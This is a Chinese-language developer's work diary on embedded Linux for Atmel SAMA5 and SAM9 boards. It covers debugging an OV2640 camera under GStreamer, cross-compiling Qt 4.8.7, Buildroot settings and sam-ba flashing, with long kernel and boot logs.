soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
ERROR: from element /GstPipeline:pipeline0/GstV4l2Src:v4l2src0: Iov2640 0-0030: ov2640_hw_power: DISABLE the camera
natmel_isi f0008000.isi: Atmel ISI Camera driver detached from camera 0
tsoc-camera-pdrv soc-camera-pdrv.0: camera device close
ernal data flow error.
Additional debug info:
gstbasesrc.c(2948): gst_base_src_loop (): /GstPipeline:pipeline0/GstV4l2Src:v4l2src0:
streaming task paused, reason not-negotiated (-4)
Execution ended after 0:00:00.455205440
Setting pipeline to PAUSED ...
Setting pipeline to READY ...
Setting pipeline to NULL ...
Freeing pipeline ...

gstreamer0.1 成功log:
Setting pipeline to PAUSED ...
//soc_camera_open 
atmel_isi f0008000.isi: Atmel ISI Camera driver attached to camera 0
clk_system_prepare //打开时钟输出开关
ov2640 0-0030: ov2640_hw_power: ENABLE the camera
//soc_camera_open 里的 soc_camera_set_fmt
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 800x600)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 800x600)
ov2640 0-0030: ov2640_set_params: Selected cfmt YUYV (YUV422)
//...i2c通讯
soc-camera-pdrv soc-camera-pdrv.0: set width: 800 height: 600
atmel_isi f0008000.isi: Flags cam: 0x175 host: 0x1fd common: 0x175
atmel_isi f0008000.isi: vsync active high, hsync active high, sampling on pix clock rising edge //至此完成soc_camera_set_fmt
soc-camera-pdrv soc-camera-pdrv.0: camera device open	//至此,完成了 soc_camera_open 打开ov2640的步骤
//然后就是不断地 ops->vidioc_try_fmt_vid_cap : soc_camera_try_fmt_vid_cap -> soc_camera_try_fmt -> TRY_FMT
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
......
//然后 ops-> vidioc_g_fmt_vid_cap : soc_camera_g_fmt_vid_cap->"current_fmt->fourcc"
soc-camera-pdrv soc-camera-pdrv.0: current_fmt->fourcc: 0x56595559
//然后 ops-> vidioc_s_fmt_vid_cap : soc_camera_s_fmt_vid_cap -> soc_camera_set_fmt
//...i2c通讯
soc-camera-pdrv soc-camera-pdrv.0: set width: 640 height: 480
atmel_isi f0008000.isi: Flags cam: 0x175 host: 0x1fd common: 0x175
atmel_isi f0008000.isi: vsync active high, hsync active high, sampling on pix clock rising edge//至此第二次完成soc_camera_set_fmt
//然后是 vb2_ops->queue_setup : queue_setup
atmel_isi f0008000.isi: queue_setup, count=2, size=614400
//v4l2_file_operations->mmap : soc_camera_mmap
soc-camera-pdrv soc-camera-pdrv.0: mmap called, vma=0xd42423a0
soc-camera-pdrv soc-camera-pdrv.0: vma start=0xb68c4000, size=614400, ret=0
//v4l2_file_operations->mmap : soc_camera_mmap
soc-camera-pdrv soc-camera-pdrv.0: mmap called, vma=0xd4242500
soc-camera-pdrv soc-camera-pdrv.0: vma start=0xb682e000, size=614400, ret=0
//pmc开启计时器??反正不重要的
clk_sam9x5_peripheral_enable
Pipeline is live and does not need PREROLL ...
Setting pipeline to PLAYING ...
New clock: GstSystemClock

对比成功log 和不成功log 发现 gstreamer1.0 应该是多线程工作的,所以发现虽然开始时是无尽的关闭重启,重启关闭,但是最后还是看到一些端倪,
发现gstreamer1.0可能真的需要多次重启关闭重启关闭,然而在程序使用的时候,因为i2c初始化的log占据大量时间,
	导致,gstreamer1.0工作时,摄像头还是没有初始化好!!!
所以先尝试关闭内核i2c调试信息!!!
make ARCHarm menuconfig: Device Driver -> I2C upport -> 不选 I2C core debugging message 和 i2c Bus debugging messages 
编译和烧录测试, 没有用!!!
但是发现了,除去i2clog后, 在Setting pipeline to PAUSED ... 只有一回合开了又关
	在i2clog未去前,有两回合,开了又关
终于,感觉 摄像头打开和软件初始化采集工作并不是顺序进行而是并行进行的,以至于,软件开始采集时,摄像头其实还没有初始化完!!!









20170324
dunp_stack soc_camera_open 和 soc_camera_close 
发现只能跟踪到内核态里的调用,上不去用户态的调用关系!
soc_camera_close
[<c0013814>] (unwind_backtrace) from [<c00117f4>] (show_stack+0x10/0x14)
[<c00117f4>] (show_stack) from [<c033ffcc>] (soc_camera_close+0x18/0xc8)
[<c033ffcc>] (soc_camera_close) from [<c0324840>] (v4l2_release+0x34/0x74)
[<c0324840>] (v4l2_release) from [<c0096500>] (__fput+0x80/0x1b0)
[<c0096500>] (__fput) from [<c003068c>] (task_work_run+0x88/0xbc)
[<c003068c>] (task_work_run) from [<c0011464>] (do_work_pending+0x94/0xb4)
[<c0011464>] (do_work_pending) from [<c000f3ac>] (work_pending+0xc/0x20)
soc_camera_open
[<c0013814>] (unwind_backtrace) from [<c00117f4>] (show_stack+0x10/0x14)
[<c00117f4>] (show_stack) from [<c0340094>] (soc_camera_open+0x18/0x2d4)
[<c0340094>] (soc_camera_open) from [<c0324920>] (v4l2_open+0xa0/0xe0)
[<c0324920>] (v4l2_open) from [<c0098958>] (chrdev_open+0xa0/0x140)
[<c0098958>] (chrdev_open) from [<c0093858>] (do_dentry_open.isra.11+0xe8/0x2e8)
[<c0093858>] (do_dentry_open.isra.11) from [<c009f460>] (do_last.isra.43+0x4cc/0xb9c)
[<c009f460>] (do_last.isra.43) from [<c00a0f48>] (path_openat+0x7c/0x520)
[<c00a0f48>] (path_openat) from [<c00a2140>] (do_filp_open+0x2c/0x80)
[<c00a2140>] (do_filp_open) from [<c009495c>] (do_sys_open+0x110/0x1cc)
[<c009495c>] (do_sys_open) from [<c000f360>] (ret_fast_syscall+0x0/0x3c)
感觉,open和close是两个独立的线程或者是进程并行工作的,而不是在同一个线程里顺序工作!!!
使用 meld 来观察 gst-launch-1.0.c 和 gst-lanuch-0.1.c 的区别!!
共同特点是 Setting pipeline to PAUSED ... 后都启动 soc_camera_open
但是1.0 在之前也来了一回合开关 soc_camera_open
0.1版,在Pipeline is live and does not need PREROLL ... 之前完成了 ov2640 整个初始化,
1.0版,在Pipeline is live and does not need PREROLL ... 之前未完成 ov2640 整个初始化,
Setting pipeline to PAUSED ... 与 Pipeline is live and does not need PREROLL ... 间
	隔着一个 ret = gst_element_set_state (pipeline, GST_STATE_PAUSED); 函数!!
无意中怀疑一个gst打开/dev/video0的函数:
	gst_v4l2_object_open()->gst_v4l2_open
无意中习得一种 gstreamer 的调试手段!!!
在 gst-launch 命令前 加上 GST_DEBUG=...
例如: GST_DEBUG=6 gst-launch-1.0 ....		//这里是把所有6级及以下的调试信息都打印出来
例如: GST_DEBUG=GST_ELEMENT_*:6 gst-launch-1.0 ...	//这是把所有 GST_ELEMENT_*组别的 6级及以下的调试信息都打印出来












20170327
由于gstreamer1.0 与ov2640 的冲突实在是太明显了,所以就尝试使用 qt4 避开gsreamer1.0
所以先在buildroot里移植qt4
	使用buildroot1 make menuconfig:选qt
	除了要勾上例程外,还要注意pixel depths 的设置,例如,开发板只支持24位的rgb888模式, 
		不然运行测试程序会显示blit_setup(): Screen depth 24 not supported! 之类的错误
	还有 graphic driver 选 linux framebuffer mouse driver选 linux input 或者 tslib
	最后虽然成功显示,但是似乎并没有打开触摸屏未知原因!!
还有 qt4程序的执行  一定要加 -qws 参数才可以
	例如 : ./fingerpaint -qws &		//& 表示进程后台运行,不占据 tty串口控制台console,不后台进行可以不加&	
结果,发现例程都没有打开触摸屏!!!,(如果打开了,会有消息显示)不知到为啥!!
然后再编译pc上的qt4 环境:
首先擦哈坎buildroot 发现使用的是qt-4.8.7,所以移植qt-4.8.7
从官网下载了qt4.8.7并解压,然后开始编译安装:
首先修改mkspecs/qws/linux-arm-gnueabi-g++:
#
# qmake configuration for building with arm-none-linux-gnueabi-g++
#

include(../../common/linux.conf)
include(../../common/gcc-base-unix.conf)
include(../../common/g++-unix.conf)
include(../../common/qws.conf)

# modifications to g++.conf
QMAKE_CC                = arm-linux-gnueabihf-gcc
QMAKE_CXX               = arm-linux-gnueabihf-g++
QMAKE_LINK              = arm-linux-gnueabihf-g++
QMAKE_LINK_SHLIB        = arm-linux-gnueabihf-g++

# modifications to linux.conf
QMAKE_AR                = arm-linux-gnueabihf-ar cqs
QMAKE_OBJCOPY           = arm-linux-gnueabihf-objcopy
QMAKE_STRIP             = arm-linux-gnueabihf-strip

load(qt_config)
然后执行:./configure -force-pkg-config -release -opensource -v -embedded arm -xplatform qws/linux-arm-gnueabi-g++ -prefix /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-4.8.7/armv7-a -no-fast
//-force-pkg-config 不加上会出现 关于 pkg-config 的错误,此外mkspecs/qws/linux-arm-gnueabi-g++ 不修改过来也出现这种错误,
//-no-fast 表示编译所有模块!!!
然后make -j8 & make install
然后配置qtcreator 再编译一个例子程序和 camera程序烧到开发板,成功运行
然而还是有些问题未能解决:
	都没有打开触摸屏驱动
	camera2例子中,ov2640成功打开,但图像错乱,USB摄像头不能打开,直接出现段错误!!!
	(问题暂时搁置)
勉强成功安装测试了 qt4.8.7
另外,如果程序出现这种错误!!
‘close’ was not declared in this scope
没有包含头文件 unistd.h 造成的。
加上'
#include <unistd.h>











20170328
今天暂时不弄摄像头问题,直接处理sam9x35的板子
板子预装了linux系统,开机截取log:
RomBOOT
Start AT91Bootstrap...
Init DDR... Done!
Loading 1-Wire info...
Enumerate all roms:
Rom#0x0: 0xad 0x0 0x0 0x2 0xab 0xbb 0x1 0x2d 
Rom#0x1: 0x78 0x0 0x0 0x3 0x21 0xaf 0x93 0x2d 
Rom#0x2: 0x7a 0x0 0x0 0x1 0x2 0xb3 0x1f 0x23 
Done, 0x3 1-wire chips found!

Board name: SAM9X35-CM [B2]; Vendor name: RONETIX
Board name: SAM9x5-EK [B0]; Vendor name: FLEX
Board name: SAM9x5-DM [B0]; Vendor name: FLEX
sn: 0x4010466;   rev: 0x10421
Downloading image...
chip id: 0xadda
Copy 0x50000 bytes from 0x40000 to 0x26f00000
Done!


U-Boot 2010.06 (Jun 23 2011 - 10:51:37)

DRAM:  128 MiB
NAND:  256 MiB
In:    serial
Out:   serial
Err:   serial
Net:   macb0
macb0: Starting autonegotiation...
macb0: Autonegotiation complete
macb0: link up, 100Mbps full-duplex (lpa: 0x4de1)
Hit any key to stop autoboot:  0 

NAND read: device 0 offset 0x200000, size 0x250000
 2424832 bytes read: OK
## Booting kernel from Legacy Image at 22000000 ...
   Image Name:   Angstrom/2.6.39/at91sam9x5ek
   Image Type:   ARM Linux Kernel Image (uncompressed)
   Data Size:    2351680 Bytes = 2.2 MiB
   Load Address: 20008000
   Entry Point:  20008000
   Verifying Checksum ... OK
   Loading Kernel Image ... OK
OK

Starting kernel ...

Uncompressing Linux... done, booting the kernel.
Linux version 2.6.39 (nferre@RFOLXTS02.rfo.atmel.com) (gcc version 4.5.3 20110223 (prerelease) (GCC) ) #1 Thu Jun 23 09:29:18 CEST 2011
CPU: ARM926EJ-S [41069265] revision 5 (ARMv5TEJ), cr=00053177
CPU: VIVT data cache, VIVT instruction cache
Machine: Atmel AT91SAM9X5-EK
Memory policy: ECC disabled, Data cache writeback
Clocks: CPU 400 MHz, master 133 MHz, main 12.000 MHz
Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 32512
Kernel command line: mem=128M console=ttyS0,115200 mtdparts=atmel_nand:8M(bootstrap/uboot/kernel)ro,-(rootfs) root=/dev/mtdblock1 rw rootfstype=ubifs ubi.mtd=1 root=ubi0:root
PID hash table entries: 512 (order: -1, 2048 bytes)
Dentry cache hash table entries: 16384 (order: 4, 65536 bytes)
Inode-cache hash table entries: 8192 (order: 3, 32768 bytes)
Memory: 128MB = 128MB total
Memory: 124972k/124972k available, 6100k reserved, 0K highmem
Virtual kernel memory layout:
    vector  : 0xffff0000 - 0xffff1000   (   4 kB)
    fixmap  : 0xfff00000 - 0xfffe0000   ( 896 kB)
    DMA     : 0xff000000 - 0xffe00000   (  14 MB)
    vmalloc : 0xc8800000 - 0xfee00000   ( 870 MB)
    lowmem  : 0xc0000000 - 0xc8000000   ( 128 MB)
    modules : 0xbf000000 - 0xc0000000   (  16 MB)
      .init : 0xc0008000 - 0xc002a000   ( 136 kB)
      .text : 0xc002a000 - 0xc0489d68   (4480 kB)
      .data : 0xc048a000 - 0xc04baee0   ( 196 kB)
NR_IRQS:192
AT91: 128 gpio irqs in 4 banks
Console: colour dummy device 80x30
console [ttyS0] enabled
Calibrating delay loop... 199.06 BogoMIPS (lpj=995328)
pid_max: default: 32768 minimum: 301
Mount-cache hash table entries: 512
CPU: Testing write buffer coherency: ok
devtmpfs: initialized
NET: Registered protocol family 16
AT91: CM rev B and higher
AT91: EK rev B and higher
AT91: Power Management (with slow clock mode)
AT91: Starting after user reset
bio: create slab <bio-0> at 0
SCSI subsystem initialized
usbcore: registered new interface driver usbfs
usbcore: registered new interface driver hub
usbcore: registered new device driver usb
i2c-gpio i2c-gpio.0: using pins 62 (SDA) and 63 (SCL)
at_hdmac at_hdmac.0: Atmel AHB DMA Controller ( cpy slave ), 8 channels
at_hdmac at_hdmac.1: Atmel AHB DMA Controller ( cpy slave ), 8 channels
Advanced Linux Sound Architecture Driver Version 1.0.24.
Switching to clocksource tcb_clksrc
NET: Registered protocol family 2
IP route cache hash table entries: 1024 (order: 0, 4096 bytes)
TCP established hash table entries: 4096 (order: 3, 32768 bytes)
TCP bind hash table entries: 4096 (order: 2, 16384 bytes)
TCP: Hash tables configured (established 4096 bind 4096)
TCP reno registered
UDP hash table entries: 256 (order: 0, 4096 bytes)
UDP-Lite hash table entries: 256 (order: 0, 4096 bytes)
NET: Registered protocol family 1
RPC: Registered udp transport module.
RPC: Registered tcp transport module.
RPC: Registered tcp NFSv4.1 backchannel transport module.
JFFS2 version 2.2. (NAND) (SUMMARY)  © 2001-2006 Red Hat, Inc.
msgmni has been set to 244
Block layer SCSI generic (bsg) driver version 0.4 loaded (major 253)
io scheduler noop registered (default)
atmel_hlcdfb atmel_hlcdfb_base.0: 1500KiB frame buffer at 27a00000 (mapped at ffc00000)
cfg80211: Calling CRDA to update world regulatory domain
atmel_hlcdfb atmel_hlcdfb_base.0: fb0: Atmel LCDC at 0xf8038000 (mapped at c8864000), irq 25
atmel_hlcdfb atmel_hlcdfb_ovl.0: 1500KiB frame buffer at 27000000 (mapped at ffa00000)
atmel_hlcdfb atmel_hlcdfb_ovl.0: fb1: Atmel LCDC at 0xf8038100 (mapped at c886c100), irq -6
atmel_usart.0: ttyS0 at MMIO 0xfefff200 (irq = 1) is a ATMEL_SERIAL
atmel_usart.1: ttyS1 at MMIO 0xf801c000 (irq = 5) is a ATMEL_SERIAL
brd: module loaded
loop: module loaded
ssc ssc.0: Atmel SSC device at 0xc8880000 (irq 28)
atmel_nand atmel_nand: Using dma0chan0 for DMA transfers.
ONFI flash detected
NAND device: Manufacturer ID: 0xad, Chip ID: 0xda (Hynix NAND 256MiB 3,3V 8-bit)
atmel_pmecc_init_params
Scanning device for bad blocks
Bad eraseblock 147 at 0x000001260000
2 cmdlinepart partitions found on MTD device atmel_nand
Creating 2 MTD partitions on "atmel_nand":
0x000000000000-0x000000800000 : "bootstrap/uboot/kernel"
0x000000800000-0x000010000000 : "rootfs"
UBI: attaching mtd1 to ubi0
UBI: physical eraseblock size:   131072 bytes (128 KiB)
UBI: logical eraseblock size:    126976 bytes
UBI: smallest flash I/O unit:    2048
UBI: VID header offset:          2048 (aligned 2048)
UBI: data offset:                4096
UBI: max. sequence number:       11
UBI: attached mtd1 to ubi0
UBI: MTD device name:            "rootfs"
UBI: MTD device size:            248 MiB
UBI: number of good PEBs:        1983
UBI: number of bad PEBs:         1
UBI: number of corrupted PEBs:   0
UBI: max. allowed volumes:       128
UBI: wear-leveling threshold:    4096
UBI: number of internal volumes: 1
UBI: number of user volumes:     1
UBI: available PEBs:             0
UBI: total number of reserved PEBs: 1983
UBI: number of PEBs reserved for bad PEB handling: 19
UBI: max/mean erase counter: 2/0
UBI: image sequence number:  46740637
CAN device driver interface
at91_can at91sam9x5_can.1: can0: Features changed: 0x00004804 -> 0x00004004
at91_can at91sam9x5_can.1: device registered (reg_base=c88e0000, irq=30)
macb macb.0: invalid hw address, using random
macb macb.0: eth0: Features changed: 0x00004800 -> 0x00004000
MACB_mii_bus: probed
eth0: Atmel MACB at 0xf802c000 irq 24 (1a:61:4a:e7:06:84)
eth0: attached PHY driver [Davicom DM9161A] (mii_bus:phy_addr=0:00, irq=-1)
ehci_hcd: USB 2.0 'Enhanced' Host Controller (EHCI) Driver
atmel-ehci atmel-ehci: Atmel EHCI UHP HS
atmel-ehci atmel-ehci: new USB bus registered, assigned bus number 1
atmel-ehci atmel-ehci: irq 22, io mem 0x00700000
UBI: background thread "ubi_bgt0d" started, PID 29
atmel-ehci atmel-ehci: USB 2.0 started, EHCI 1.00
hub 1-0:1.0: USB hub found
hub 1-0:1.0: 3 ports detected
ohci_hcd: USB 1.1 'Open' Host Controller (OHCI) Driver
at91_ohci at91_ohci: AT91 OHCI
at91_ohci at91_ohci: new USB bus registered, assigned bus number 2
at91_ohci at91_ohci: irq 22, io mem 0x00600000
hub 2-0:1.0: USB hub found
hub 2-0:1.0: 3 ports detected
Initializing USB Mass Storage driver...
usbcore: registered new interface driver usb-storage
USB Mass Storage support registered.
usbcore: registered new interface driver libusual
atmel_usba_udc atmel_usba_udc: MMIO registers at 0xf803c000 mapped at c88ee000
atmel_usba_udc atmel_usba_udc: FIFO at 0x00500000 mapped at c8900000
qt1070 0-001b: AT42QT1070 firmware version 15
input: AT42QT1070 QTouch Sensor as /devices/platform/i2c-gpio.0/i2c-0/0-001b/input/input0
atmel_tsadcc atmel_tsadcc: Master clock is set at: 133333333 Hz
atmel_tsadcc atmel_tsadcc: Prescaler is set at: 221
input: atmel touch screen controller as /devices/platform/atmel_tsadcc/input/input1
at91_rtc at91_rtc: rtc core: registered at91_rtc as rtc0
AT91 Real Time Clock driver.
i2c /dev entries driver
Linux media interface: v0.10
lirc_dev: IR Remote Control driver registered, major 249 
IR NEC protocol handler initialized
IR RC5(x) protocol handler initialized
IR RC6 protocol handler initialized
IR JVC protocol handler initialized
IR Sony protocol handler initialized
IR RC5 (streamzap) protocol handler initialized
IR LIRC bridge handler initialized
Linux video capture interface: v2.00
usbcore: registered new interface driver usbhid
usbhid: USB HID core driver
asoc: wm8731-hifi <-> atmel-ssc-dai.0 mapping ok
ASoC: at91sam9x5ek_init ok
ALSA device list:
  #0: AT91SAM9X5
nf_conntrack version 0.5.0 (1952 buckets, 7808 max)
ip_tables: (C) 2000-2006 Netfilter Core Team
TCP cubic registered
NET: Registered protocol family 17
can: controller area network core (rev 20090105 abi 8)
NET: Registered protocol family 29
can: raw protocol (rev 20090105)
lib80211: common routines for IEEE802.11 drivers
Registering the dns_resolver key type
at91_rtc at91_rtc: setting system clock to 2007-01-01 00:41:58 UTC (1167612118)
atmel_mci atmel_mci.0: Using dma0chan1 for DMA transfers
atmel_mci atmel_mci.0: Atmel MCI controller at 0xf0008000 irq 12, 1 slots
atmel_mci atmel_mci.1: Using dma1chan0 for DMA transfers
atmel_mci atmel_mci.1: Atmel MCI controller at 0xf000c000 irq 26, 1 slots
UBIFS: recovery needed
UBIFS: recovery completed
UBIFS: mounted UBI device 0, volume 0, name "root"
UBIFS: file system size:   247476224 bytes (241676 KiB, 236 MiB, 1949 LEBs)
UBIFS: journal size:       9023488 bytes (8812 KiB, 8 MiB, 72 LEBs)
UBIFS: media format:       w4/r0 (latest is w4/r0)
UBIFS: default compressor: lzo
UBIFS: reserved for root:  0 bytes (0 KiB)
VFS: Mounted root (ubifs filesystem) on device 0:13.
devtmpfs: mounted
Freeing init memory: 136K
init started: BusyBox v1.17.1 (2011-06-15 05:54:27 CEST)
starting pid 35, tty '/dev/console': '/etc/init.d/rcS'
mounting filesystems...done.
running rc.d services...
starting atmel-qml...done
starting udev
mounting tmpfs at /dev
creating static nodes
starting udevd...done
waiting for devices...done
Starting telnetd...
restoring mixer state...no /etc/asound.state, aborting
starting network interfaces...
udhcpc (v1.17.1) started
Sending discover...
eth0: link up (100/Full)
Sending discover...
Sending select for 200.200.200.110...
Lease of 200.200.200.110 obtained, lease time 7200
deleting routers
route: SIOCDELRT: No such process
adding dns 114.114.114.114
adding dns 200.200.200.1
loading modules

OSELAS(R)-SAM9-master (ptxdist-2011.06.0/2011-06-15T08:38:53+0200)

    _   _                  _ 
   / \ | |_ _ __ ___   ___| |
  / _ \| __| '_ ` _ \ / _ \ |
 / ___ \ |_| | | | | |  __/ |
/_/   \_\__|_| |_| |_|\___|_|
                             
 ____    _    __  __  ___  
/ ___|  / \  |  \/  |/ _ \ 
\___ \ / _ \ | |\/| | (_) |
 ___) / ___ \| |  | |\__, |
|____/_/   \_\_|  |_|  /_/ 
                           


starting pid 148, tty '/dev/console': '/sbin/getty -L 115200 ttyS0 vt100'

SAM9 login: root
login[148]: root login on 'ttyS0'
running /etc/profile.local
root@SAM9:~ 
经过观察,这板子是cpu ARM926EJ-S, 也属于Atmel AT91SAM9X5-EK
测试 sam-ba 的连接
先把核心板的 J1 跳线断开, 按nrst (reset)按钮,然后再闭合跳线
官网下载的 sam-ba2.16 窗口版本: 需要 sudo ./sam-ba 才能正常打开工作
用已装好的sam-ba3 命令行版本: 
	sudo sam-ba -p serial:ttyACM0:115200 -b sam9xx5-ek -a lowlevel	//测试连接
	//然而使用sam-ba3来烧录还是不行，未深入探究如何人使用
成功使用sam-ba2.16把demo烧录到到开发板并运行!!!
	//直接使用demo 的 .sh 执行文件实现的，修改 .tcl 文件，可以把自己编译的文件烧入系统
	//比起打开sam-ba2的窗口界面，以上命令行方式更快捷
想把现成的buildroot rootfs 拷入sam9x35的，但是由于flash不一样的，编译成ubi的参数也应该不一样
	make at91sam9x5ek_defconfig  //配置buildroot
还有ubi参数貌似调对了有又出现这种问题！！
Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000000b
	终于发现了， sam9x35终究不是contex-a5 架构的，所以在编译根文件系统时也要有所设置的，不只是ubi的设置要改，target options的设置也要改
	Target Architecture (ARM (little endian))  ---> 	
	Target Binary Format (ELF)  --->
	Target Architecture Variant (arm926t)  --->	//cpu类型
	[*] Enable VFP extension support
	Target ABI (EABI)  ---> 			//一定不能错 否则Kernel panic - not syncing:。。。。
	Floating point strategy (Soft float)  --->	//一定不能错 否则Kernel panic - not syncing:。。。。
	ARM instruction set (ARM)  --->  	
最后成功启动并能打开lcd 关于 touchscreen 的启动情况未得知
	但是，预装系统的触摸屏运行得非常溜！！！！
sam9x35的编译环境基本建立！！！
补充:核心板 J2跳线: 断开 nandflash启动 ， 闭合 sdcard启动
	   J1跳线： 断开 烧录模式， 闭合 常规启动模式，并接到nandflash /sdcard
 











20170330
接下来处理sama5d35 的板子！！！
预装系统log：
AT91Bootstrap 3.6.1-00079-gf8860d8 (Wed Feb 19 15:25:13 CST 2014)
1-Wire: Loading 1-Wire information ...
1-Wire: ROM Searching ... Done, 0x3 1-Wire chips found

1-Wire: BoardName | [Revid] | VendorName
  #0x0  SAMA5D35-CM [BB2]      RONETIX
  #0x1  SAMA5D3x-MB [EE5]      FLEX
  #0x2  SAM9x5-DM [B0]      FLEX

1-Wire: SYS_GPBR2: 0x481046d, SYS_GPBR3: 0xa11021

NAND: ONFI flash detected
NAND: Manufacturer ID: 0x2c Chip ID: 0x32
NAND: Disable On-Die ECC
NAND: Initialize PMECC params, cap: 0x4, sector: 0x200
NAND: Image: Copy 0x80000 bytes from 0x40000 to 0x26f00000
PMECC: sector bits = 0x4, bit 1 means corrupted sector, Now correcting...
Correct error bit @[#Byte 0x1a6,Bit# 0x7] 0xd0 -> 0x50
PMECC: sector bits = 0x8, bit 1 means corrupted sector, Now correcting...
Correct error bit @[#Byte 0x1f,Bit# 0x1] 0xe3 -> 0xe1
PMECC: sector bits = 0x4, bit 1 means corrupted sector, Now correcting...
Correct error bit @[#Byte 0x2e,Bit# 0x4] 0x7e -> 0x6e
PMECC: sector bits = 0x4, bit 1 means corrupted sector, Now correcting...
Correct error bit @[#Byte 0x4e,Bit# 0x6] 0x6d -> 0x2d
NAND: Done to load image


U-Boot 2013.07-00053-g40cc764 (Feb 19 2014 - 17:53:17)

CPU: SAMA5D35
Crystal frequency:       12 MHz
CPU clock        :      528 MHz
Master clock     :      132 MHz
DRAM:  512 MiB
NAND:  256 MiB
MMC:   mci: 0
In:    serial
Out:   serial
Err:   serial
Net:   macb0
Warning: failed to set MAC address
, gmac0
Warning: failed to set MAC address

Hit any key to stop autoboot:  0 

NAND read: device 0 offset 0x200000, size 0x37be94
Bit flip in data area, byte_pos: 1173, bit_pos: 1, 0x02 -> 0x00
Bit flip in data area, byte_pos: 839, bit_pos: 2, 0x07 -> 0x03
Bit flip in data area, byte_pos: 1060, bit_pos: 7, 0x80 -> 0x00
Bit flip in data area, byte_pos: 1082, bit_pos: 1, 0x02 -> 0x00
Bit flip in data area, byte_pos: 494, bit_pos: 5, 0x61 -> 0x41
Bit flip in data area, byte_pos: 1833, bit_pos: 1, 0xa6 -> 0xa4
Bit flip in data area, byte_pos: 184, bit_pos: 6, 0xf1 -> 0xb1
Bit flip in data area, byte_pos: 1918, bit_pos: 4, 0xb6 -> 0xa6
Bit flip in data area, byte_pos: 180, bit_pos: 1, 0x7e -> 0x7c
Bit flip in data area, byte_pos: 161, bit_pos: 3, 0xfc -> 0xf4
Bit flip in data area, byte_pos: 27, bit_pos: 2, 0x8d -> 0x89
Bit flip in data area, byte_pos: 625, bit_pos: 7, 0xb1 -> 0x31
Bit flip in data area, byte_pos: 1066, bit_pos: 3, 0xfc -> 0xf4
Bit flip in data area, byte_pos: 140, bit_pos: 0, 0xe7 -> 0xe6
Bit flip in data area, byte_pos: 1507, bit_pos: 7, 0xf3 -> 0x73
Bit flip in data area, byte_pos: 1974, bit_pos: 4, 0xf9 -> 0xe9
Bit flip in data area, byte_pos: 656, bit_pos: 6, 0x54 -> 0x14
Bit flip in data area, byte_pos: 1888, bit_pos: 7, 0x80 -> 0x00
Bit flip in data area, byte_pos: 1072, bit_pos: 6, 0x40 -> 0x00
 3653268 bytes read: OK
## Loading kernel from FIT Image at 22000000 ...
   Using 'conf@sama5d35ek' configuration
   Trying 'kernel@1' kernel subimage
     Description:  AT91 SAMA5D3 Linux kernel
     Type:         Kernel Image
     Compression:  uncompressed
     Data Start:   0x22055a00
     Data Size:    3081320 Bytes = 2.9 MiB
     Architecture: ARM
     OS:           Linux
     Load Address: 0x20008000
     Entry Point:  0x20008000
     Hash algo:    crc32
     Hash value:   59f12b41
   Verifying Hash Integrity ... crc32+ OK
## Loading fdt from FIT Image at 22000000 ...
   Using 'conf@sama5d35ek' configuration
   Trying 'fdt_sama5d35ek@1' fdt subimage
     Description:  Flattened Device Tree blob for SAMA5D35EK
     Type:         Flat Device Tree
     Compression:  uncompressed
     Data Start:   0x22355e30
     Data Size:    21292 Bytes = 20.8 KiB
     Architecture: ARM
     Hash algo:    crc32
     Hash value:   0d0af010
   Verifying Hash Integrity ... crc32+ OK
   Booting using the fdt blob at 0x22355e30
   Loading Kernel Image ... OK
   Loading Device Tree to 3ba4a000, end 3ba5232b ... OK

Starting kernel ...

Uncompressing Linux... done, booting the kernel.
Booting Linux on physical CPU 0x0
Linux version 3.10.0-00354-gdf700c9 (josh@shaarm01) (gcc version 4.7.3 (Sourcery CodeBench Lite 2013.05-24) ) #1 Wed Feb 19 15:28:48 CST 2014
CPU: ARMv7 Processor [410fc051] revision 1 (ARMv7), cr=10c53c7d
CPU: PIPT / VIPT nonaliasing data cache, VIPT aliasing instruction cache
Machine: Atmel SAMA5 (Device Tree), model: Atmel SAMA5D35-EK
Memory policy: ECC disabled, Data cache writeback
AT91: Detected soc type: sama5d3
AT91: Detected soc subtype: sama5d35
AT91: sram at 0x300000 of 0x20000 mapped at 0xfef58000
CPU: All CPU(s) started in SVC mode.
Clocks: CPU 528 MHz, master 132 MHz, main 12.000 MHz
Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 130048
Kernel command line: console=ttyS0,115200 mtdparts=atmel_nand:8M(bootstrap/uboot/kernel)ro,-(rootfs) rw rootfstype=ubifs ubi.mtd=1 root=ubi0:rootfs
PID hash table entries: 2048 (order: 1, 8192 bytes)
Dentry cache hash table entries: 65536 (order: 6, 262144 bytes)
Inode-cache hash table entries: 32768 (order: 5, 131072 bytes)
Memory: 512MB = 512MB total
Memory: 513644k/513644k available, 10644k reserved, 0K highmem
Virtual kernel memory layout:
    vector  : 0xffff0000 - 0xffff1000   (   4 kB)
    fixmap  : 0xfff00000 - 0xfffe0000   ( 896 kB)
    vmalloc : 0xe0800000 - 0xff000000   ( 488 MB)
    lowmem  : 0xc0000000 - 0xe0000000   ( 512 MB)
    modules : 0xbf000000 - 0xc0000000   (  16 MB)
      .text : 0xc0008000 - 0xc0563598   (5486 kB)
      .init : 0xc0564000 - 0xc058dc64   ( 168 kB)
      .data : 0xc058e000 - 0xc05c8cc0   ( 236 kB)
       .bss : 0xc05c8cc0 - 0xc05e6298   ( 118 kB)
NR_IRQS:16 nr_irqs:16 16
sched_clock: 32 bits at 100 Hz, resolution 10000000ns, wraps every 4294967286ms
Console: colour dummy device 80x30
Calibrating delay loop... 262.96 BogoMIPS (lpj=1314816)
